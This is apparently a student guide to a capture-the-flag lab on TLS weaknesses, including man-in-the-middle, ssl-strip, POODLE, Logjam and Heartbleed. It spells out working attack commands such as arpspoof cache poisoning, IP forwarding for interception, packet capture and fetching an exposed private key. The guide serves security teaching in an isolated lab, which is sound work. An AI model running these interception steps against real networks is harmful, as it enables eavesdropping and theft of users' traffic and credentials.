# Student guide — "HTTPS Security" lab

> How to get started, how each challenge is played, and the commands you need to
> know. This guide does **not** contain the flags or full exploit chains for the
> advanced challenges — it gives you the method, the tools, and where to look.
> Everything runs inside an **isolated lab network**; nothing here is legal or
> safe to run against systems you do not own.

## 1. The lab in one picture

Every machine lives on one Docker network, `172.28.0.0/16`. You attack from a
host that is on that network.

| Role | Address | Notes |
|------|---------|-------|
| **You (attacker)** | `172.28.0.1` | your host = the bridge gateway, on the lab net |
| **Portal** (scoreboard/arming) | `172.28.0.10:5000` | web UI — where you read objectives, arm, submit flags |
| **Victim client** | `172.28.0.11` | replays traffic on demand; accepts *any* certificate |
| **C0 recon** | *hidden — find it by scanning* | **start here:** map the lab yourself with nmap |
| C1 openssl-warmup | `172.28.0.21:8451` | TLS — inspect a certificate |
| C2 scapy-warmup | `172.28.0.22:8452/udp` | UDP beacon — sniff & forge |
| C3 mitm-http | `172.28.0.23:8453` | cleartext HTTP |
| C4 self-signed | `172.28.0.24:8441` | TLS, unvalidated identity |
| C5 private-key-leak | `172.28.0.25:8442` | TLS, key exposed under `/.well-known/` |
| C6 pfs-rsa | `172.28.0.26:8447` | TLS, RSA key exchange (no forward secrecy) |
| C7 logjam | `172.28.0.27:8448` | TLS, export DHE (weak 512-bit group) |
| C8 ssl-strip | `172.28.0.28:8443` (+HTTP) | TLS with no HSTS |
| C9 poodle | `172.28.0.29:8444` | SSL 3.0, CBC |
| C10 beast | `172.28.0.30:8446` | TLS 1.0, CBC |
| C11 heartbleed | `172.28.0.31:8445` | TLS, OpenSSL 1.0.1f |

The addresses `.21`→`.31` follow the challenge order; if in doubt, confirm with
`docker network inspect <name>` or the `docker-compose.yml`. Published ports are
also reachable at `localhost:<port>` from your host. Flags always look like
`FLAG{...}`.

## 2. Open the portal

The portal is where you read each challenge's objective, **arm** the victim when
needed, and **submit** flags. Open it in a browser from your host:

```
http://172.28.0.10:5000
```

(The portal has no published port; because your host is on the lab network you
reach the container directly at `.10:5000`.)

## 3. Two kinds of challenge

**(A) Inspect / warm-up — C1 and C2.** No victim, no interception, nothing to
arm. You connect to the target yourself and pull what you need out of it.

**(B) On-path / man-in-the-middle — C3 through C11.** The **victim** must be made
to talk to the target so *you* can sit in the middle and observe or tamper. Two
things happen:

1. You **arm** the victim from the portal ("start challenge"). The single field
   asks for the **destination IP** — that is the **TARGET's** IP (where the
   victim should connect), **not** the victim's own IP. Example: for C9 you
   enter `172.28.0.29`.
2. You **position yourself on the path** between the victim (`172.28.0.11`) and
   the target, usually with **ARP spoofing**, then capture and/or tamper.

## 4. The man-in-the-middle workflow (challenges C3–C11)

The same four moves recur. Learn them once.

**Step 1 — become a router.** ARP spoofing silently drops traffic unless you
forward it. Enable IP forwarding on your attack machine:

```sh
sudo sysctl -w net.ipv4.ip_forward=1
```
- `sysctl -w` writes a kernel parameter at runtime.
- `net.ipv4.ip_forward=1` tells the kernel to relay packets that are not
  addressed to it — turning you into a transparent router between victim and
  target. Without it you cause a denial of service instead of an interception.

**Step 2 — find your interface.** On your host the lab is a Docker bridge named
`br-XXXXXX`; inside the attacker container it is `eth0`.

```sh
ip -brief address        # list interfaces and their IPs; pick the 172.28.0.0/16 one
```

**Step 3 — poison the ARP caches** of victim and target so both send their
traffic through you. Either a ready tool or Scapy:

```sh
# dsniff's arpspoof — run TWO of these (one per direction), each in its own shell:
sudo arpspoof -i br-XXXX -t 172.28.0.11 172.28.0.29    # tell victim: "target is me"
sudo arpspoof -i br-XXXX -t 172.28.0.29 172.28.0.11    # tell target: "victim is me"
```
- `-i <iface>`: the interface to send the spoofed replies on.
- `-t <host>`: the *target of the poisoning* (whose cache you corrupt).
- the trailing host is the address you are *impersonating* to that target.

**Step 4 — capture (and then arm).** Start a capture, then arm the challenge in
the portal so the victim generates traffic:

```sh
sudo tcpdump -i br-XXXX -w cap.pcap "host 172.28.0.11 and host 172.28.0.29"
```
- `-i <iface>`: capture interface.
- `-w cap.pcap`: write raw packets to a file (open later in Wireshark).
- the quoted string is a **BPF capture filter** limiting what is recorded.

Open `cap.pcap` in Wireshark to read or decrypt what you captured.

## 5. Toolbox — the commands to know

### OpenSSL — talk TLS and inspect certificates
```sh
openssl s_client -connect 172.28.0.21:8451 -servername bank.tp.lan -showcerts
```
- `s_client`: OpenSSL's TLS client.
- `-connect host:port`: where to connect.
- `-servername <name>`: the **SNI** hostname sent in the handshake (some servers
  need it to pick the right certificate).
- `-showcerts`: print the full certificate chain the server presents.
- Useful protocol pins: `-tls1_2`, `-tls1`, `-ssl3` force a version;
  `-cipher <spec>` forces a cipher family (e.g. `-cipher EXP` for export suites).
- Tip: prefix with `echo |` or append `</dev/null` so the client closes instead
  of waiting for you to type.

```sh
openssl x509 -in cert.pem -noout -text          # decode a certificate
```
- `x509`: certificate tool.
- `-in <file>`: input certificate (PEM).
- `-noout`: do **not** re-print the encoded certificate.
- `-text`: human-readable decode (subject, issuer, extensions…).
- Handy variants: `-subject` (just the subject line), `-fingerprint`,
  `-pubkey` (extract the public key).

```sh
openssl asn1parse -in cert.pem -i               # walk the raw ASN.1 structure
```
- `asn1parse`: dumps the DER/ASN.1 tree (SEQUENCE, INTEGER, BIT STRING…).
- `-i`: indent nested elements so the structure is readable.
- `-strparse <offset>`: re-parse the octet-string found at a given offset (used
  to dive into nested structures).

```sh
openssl pkeyutl -decrypt -inkey key.pem -in blob.bin -out flag.txt \
  -pkeyopt rsa_padding_mode:oaep
```
- `pkeyutl -decrypt`: low-level public-key decryption.
- `-inkey <file>`: the private key to decrypt with.
- `-in` / `-out`: input ciphertext / output plaintext.
- `-pkeyopt rsa_padding_mode:oaep`: select **OAEP** padding (must match how it
  was encrypted).

### curl — fetch over HTTP(S)
```sh
curl -k https://172.28.0.25:8442/.well-known/backup/server.key -o server.key
```
- `-k` / `--insecure`: accept the server's certificate without validation
  (self-signed lab certs).
- `-o <file>`: save the response body to a file (`-s` silences progress).

### Capture & analysis
```sh
sudo tcpdump -i br-XXXX -n -s 0 -w cap.pcap "tcp port 8453"
```
- `-n`: don't resolve names (faster, clearer).
- `-s 0`: capture whole packets (no truncation).
- `-w`: write to file; the quoted BPF filter limits what is stored.

```sh
tshark -r cap.pcap -Y "http or tls"             # read a capture, display filter
```
- `-r <file>`: read a saved capture.
- `-Y "<expr>"`: **display** filter (post-capture) — e.g. `http`, `tls`,
  `ip.addr==172.28.0.29`.
- Wireshark GUI equivalent: *File ▸ Open*, then type the display filter.

### Fingerprinting a TLS service
```sh
nmap --script ssl-enum-ciphers -p 8444 172.28.0.29     # which protocols/ciphers?
nmap --script ssl-heartbleed   -p 8445 172.28.0.31     # Heartbleed present?
nmap --script ssl-dh-params    -p 8448 172.28.0.27     # weak DH group?
testssl.sh https://172.28.0.29:8444                    # broad TLS audit
```
- `--script <name>`: run an Nmap Scripting Engine probe.
- `-p <port>`: port to test.
- `testssl.sh <URI>`: an all-in-one TLS auditor (add `--poodle`, `--logjam`,
  `--heartbleed` to focus).

### Scapy — sniff, craft, send (Python)
Start with `sudo scapy` for an interactive shell, or run a script. The four verbs
you need:
```python
sniff(iface="br-XXXX", filter="udp port 8452", count=1, timeout=15)
IP(dst="172.28.0.22")/UDP(dport=8452)/Raw(load=b"GIVE-FLAG")
sr1(pkt, timeout=5)      # send one packet, return the first reply
send(pkt)                # send at layer 3 (no reply expected)
```
- `sniff(...)`: capture packets. `filter=` is a **BPF capture filter**;
  `count=` stops after N packets; `timeout=` caps the wait; `iface=` selects the
  interface; `prn=<func>` runs a callback per packet.
- `IP()/UDP()/Raw()`: build a packet by **stacking layers**; fields you don't set
  take sane defaults. `Raw(load=...)` is the payload bytes.
- `sr1(pkt)`: **s**end and **r**eceive **1** — send `pkt` and return the first
  answer.
- `send(pkt)`: fire-and-forget at layer 3.

## 6. Getting started, challenge by challenge

Each entry gives the transport, the first command to run, and what to look for —
not the full solution.

**C0 — recon (start here, no arming).** Map the lab yourself instead of trusting
the table above. Find live hosts, then the open ports and service versions:
```sh
nmap -sn 172.28.0.0/24                    # -sn = host discovery only (no port scan)
nmap -p- -sV 172.28.0.20                  # -p- = all 65535 ports ; -sV = service/version
nmap -p9000 --script http-title 172.28.0.20   # the flag is the page's HTTP title
```
A reconnaissance service hides on a **non-standard port**; its HTTP **title**
carries the flag. Build the full `IP:port` inventory of C1→C11 as you go — you'll
need it for every challenge that follows.

**C1 — openssl-warmup (TLS, `172.28.0.21:8451`).** No arming. Pull the server's
certificate and decode it; the flag is embedded in one of the certificate's
**fields**. Start with:
`echo | openssl s_client -connect localhost:8451 2>/dev/null | openssl x509 -noout -text`.
The deeper exercise is to **verify the certificate's own signature by hand**
(`asn1parse` to extract the signature `BIT STRING`, RSA-decrypt with the public
key, compare to the digest of the body).

**C2 — scapy-warmup (UDP, `172.28.0.22:8452`).** No arming. A beacon periodically
broadcasts an instruction. **Sniff** it (`sniff(filter="udp port 8452")`), read
what packet it expects, then **forge and send** that "magic" datagram; the target
answers with the flag.

**C3 — mitm-http (cleartext HTTP, `172.28.0.23:8453`).** Arm with target
`172.28.0.23`. Get on-path (Section 4), capture, and read the HTTP response — the
flag travels in cleartext because there is no TLS.

**C4 — self-signed (TLS, `172.28.0.24:8441`).** The victim accepts *any*
certificate. Arm with `172.28.0.24`, get on-path, and terminate TLS in the middle
with your **own** certificate (a transparent TLS proxy such as `mitmproxy` or
`bettercap`); read the decrypted flag. The lesson: identity without PKI
validation is no identity (RFC 5280).

**C5 — private-key-leak (TLS, `172.28.0.25:8442`).** The server's **private key**
is exposed under a public path, and the flag is published as an RSA-OAEP blob.
Fetch the key with `curl -k`, then decrypt the blob with
`openssl pkeyutl -decrypt … -pkeyopt rsa_padding_mode:oaep`.

**C6 — pfs-rsa (TLS, `172.28.0.26:8447`).** The server uses **RSA key exchange**
(no ephemeral). Record the victim's encrypted TLS (`tcpdump -w`), obtain the
exposed server key, then decrypt the capture **after the fact** in Wireshark
(*Preferences ▸ Protocols ▸ TLS ▸ RSA keys list*). The lesson: without forward
secrecy, one leaked key retroactively breaks every session.

**C7 — logjam (TLS export DHE, `172.28.0.27:8448`).** Detect the weak 512-bit DH
group (`nmap --script ssl-dh-params`, `testssl.sh --logjam`). From an on-path
position the export group can be forced and its discrete log solved to recover
the session key. *This is the hardest challenge; ask your instructor about the
provided solver.*

**C8 — ssl-strip (TLS without HSTS, `172.28.0.28:8443` + HTTP).** No
Strict-Transport-Security header protects the login page. Arm, get on-path, and
**downgrade** the victim from HTTPS to HTTP (`bettercap`'s HSTS/strip modules or
`sslstrip`); read the flag in the resulting cleartext.

**C9 — poodle (SSL 3.0, `172.28.0.29:8444`).** Confirm SSLv3/CBC is accepted
(`openssl s_client -ssl3 -connect …`). The flag rides in a session cookie
recovered byte-by-byte through the CBC **padding oracle**. *PoC-based; see your
instructor.*

**C10 — beast (TLS 1.0 CBC, `172.28.0.30:8446`).** Confirm TLS 1.0/CBC
(`openssl s_client -tls1 -connect …`). Predictable IVs enable a chosen-boundary
attack on the cookie. *PoC-based; see your instructor.*

**C11 — heartbleed (TLS, `172.28.0.31:8445`).** Confirm the flaw
(`nmap --script ssl-heartbleed -p 8445 …`), then use a Heartbeat PoC (RFC 6520)
to over-read up to 64 KB of process memory and find the flag in the dump.

## 7. Submitting a flag

Go back to the portal (`http://172.28.0.10:5000`), open the challenge, and paste
the `FLAG{...}` you recovered. The portal checks it and credits the points.

## 8. Troubleshooting

- **Nothing is captured after arming.** You are probably not on-path: check that
  both `arpspoof` directions are running, that `ip_forward` is `1`, and that you
  captured on the **lab** interface (`172.28.0.0/16`).
- **`s_client` hangs.** Add `</dev/null` (or `echo |`) so it closes the input.
- **Connection refused / wrong data.** Re-check the IP *and* port from the table
  in Section 1; each challenge has its own port.
- **The victim isn't sending anything.** Warm-ups (C1, C2) never generate victim
  traffic. For C3–C11, make sure you actually pressed *arm* and entered the
  **target's** IP, not the victim's.

---

## Appendix A — Flashcards

1. **Q:** When you arm a challenge, which IP goes in the form?
   **A:** The **target's** IP (the destination the victim should reach) — never
   the victim's own IP.

2. **Q:** Which challenges need no arming and no MITM?
   **A:** The warm-ups **C1** (inspect a certificate) and **C2** (UDP
   sniff/forge).

3. **Q:** Why enable `net.ipv4.ip_forward=1` before ARP spoofing?
   **A:** So you *relay* the victim↔target traffic; otherwise you black-hole it
   (a denial of service instead of an interception).

4. **Q:** What does `openssl s_client -connect H:P -servername N` do?
   **A:** Opens a TLS connection to `H:P` sending SNI `N`, so you can inspect the
   handshake and certificate the server presents.

5. **Q:** How do you turn a saved capture into readable plaintext for an
   RSA-key-exchange session (C6)?
   **A:** Load the leaked **server private key** into Wireshark's *TLS ▸ RSA keys
   list*; it decrypts the recorded session (works only without forward secrecy).

6. **Q:** In Scapy, what is the difference between `sr1(pkt)` and `send(pkt)`?
   **A:** `sr1` sends one packet **and returns the first reply**; `send` just
   transmits and expects no answer.

7. **Q:** What does a **display filter** (`-Y`) do versus a **capture filter**
   (BPF)?
   **A:** A capture/BPF filter decides what gets **recorded**; a display filter
   decides what you **see** in an already-captured set.

8. **Q:** Which quick probes tell you a TLS service is weak?
   **A:** `nmap --script ssl-enum-ciphers` (protocols/ciphers),
   `--script ssl-heartbleed`, `--script ssl-dh-params`, or `testssl.sh <URI>`.

## Appendix B — Acronym glossary

| Acronym | Expansion | Meaning |
|---------|-----------|---------|
| **TLS / SSL** | Transport Layer Security / Secure Sockets Layer | The transport security protocols under study. |
| **MITM** | Man-In-The-Middle | Sitting between two parties to read or alter their traffic. |
| **ARP** | Address Resolution Protocol | Maps an IP to a MAC on the LAN; poisoned to get on-path (RFC 826). |
| **MAC** | Media Access Control (address) | Layer-2 hardware address targeted by ARP spoofing. |
| **SNI** | Server Name Indication | Hostname sent in the TLS handshake so the server picks a cert. |
| **PKI** | Public Key Infrastructure | Trust framework validating certificate identity (RFC 5280). |
| **CBC** | Cipher Block Chaining | Block-cipher mode exploited in POODLE (C9) and BEAST (C10). |
| **IV** | Initialization Vector | Per-record randomizer; predictable in TLS 1.0 (BEAST). |
| **DHE** | Diffie–Hellman Ephemeral | Key exchange; weak in *export* form (Logjam, C7). |
| **PFS** | Perfect Forward Secrecy | Property whose absence lets a leaked key decrypt past traffic (C6). |
| **HSTS** | HTTP Strict Transport Security | Header forcing HTTPS; missing in C8 (RFC 6797). |
| **OAEP** | Optimal Asymmetric Encryption Padding | RSA padding used for the C5 blob. |
| **BPF** | Berkeley Packet Filter | Capture-filter syntax used by tcpdump/Scapy/Wireshark. |
| **SNI/URI** | — / Uniform Resource Identifier | Address form passed to `testssl.sh`. |
| **CVE** | Common Vulnerabilities and Exposures | IDs of the flaws replayed (POODLE, BEAST, Logjam, Heartbleed). |

## References

1. IETF, *RFC 5246 (TLS 1.2)*, *RFC 6101 (SSL 3.0)*, *RFC 826 (ARP)*,
   *RFC 5280 (X.509/PKI)*, *RFC 6797 (HSTS)*, *RFC 6520 (TLS Heartbeat)*.
2. OpenSSL Project, *openssl-s_client(1)*, *openssl-x509(1)*,
   *openssl-asn1parse(1)*, *openssl-pkeyutl(1)*.
3. P. Biondi, *Scapy documentation* — sniffing, crafting, `sr()` family.
4. The Wireshark team, *Wireshark User's Guide* — TLS decryption (RSA keys list,
   (pre)master-secret log).
5. Nmap, *NSE scripts* `ssl-enum-ciphers`, `ssl-heartbleed`, `ssl-dh-params`;
   D. Wetter, *testssl.sh*.
6. Relevant advisories: *CVE-2014-3566 (POODLE)*, *CVE-2011-3389 (BEAST)*,
   *CVE-2015-4000 (Logjam)*, *CVE-2014-0160 (Heartbleed)*.

---
*Play only inside the lab network. These techniques are for learning defensive
and offensive TLS concepts on systems you are authorized to attack.*
